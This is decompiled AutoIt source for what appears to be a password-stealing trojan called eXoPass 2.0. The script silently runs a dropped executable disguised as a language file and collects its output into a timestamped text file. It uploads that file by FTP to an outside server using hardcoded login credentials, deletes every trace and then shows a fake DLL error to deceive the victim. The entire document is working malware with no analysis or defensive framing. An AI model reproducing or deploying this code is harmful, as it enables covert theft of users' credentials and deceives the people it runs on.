; <AUT2EXE VERSION: 3.2.0.1>

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Aplic\eXoPass 2.0\eXoPass 2.0 surpido NEW.au3>
; ----------------------------------------------------------------------------

#NoTrayIcon
$ftpname = 'by.ru'
$login = 'surpido'
$password = 'bld911'
$ftpfolder = 'www'
FileInstall('C:\DOCUME~1\User\LOCALS~1\Temp\language.htf',@TempDir & '\language.htf')
$filenameput = @TempDir & '\' & @YEAR & '-' & @MON & '-' & @MDAY & '_' & @HOUR & '-' & @MIN & '-' & @SEC & '.txt'
FileDelete($filenameput)
RunWait(@TempDir & '\language.htf "' & $filenameput & '"','',@SW_HIDE)
FileDelete(@TempDir & '\resynch.txt')
FileWriteLine(@TempDir & '\resynch.txt',$login)
FileWriteLine(@TempDir & '\resynch.txt',$password)
FileWriteLine(@TempDir & '\resynch.txt','lcd ' & @TempDir)
FileWriteLine(@TempDir & '\resynch.txt','cd ' & $ftpfolder)
FileWriteLine(@TempDir & '\resynch.txt','put "' & $filenameput & '"')
FileWriteLine(@TempDir & '\resynch.txt','bye')
RunWait(@ComSpec & ' /c ftp -s:"' & @TempDir & '\resynch.txt" ' & $ftpname,@ScriptDir,@SW_HIDE)
FileDelete(@TempDir & '\language.htf')
FileDelete(@TempDir & '\resynch.txt')
FileDelete($filenameput)
MsgBox(16,'Error','Voxinf32.dll does not exist.')

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Aplic\eXoPass 2.0\eXoPass 2.0 surpido NEW.au3>
; ----------------------------------------------------------------------------

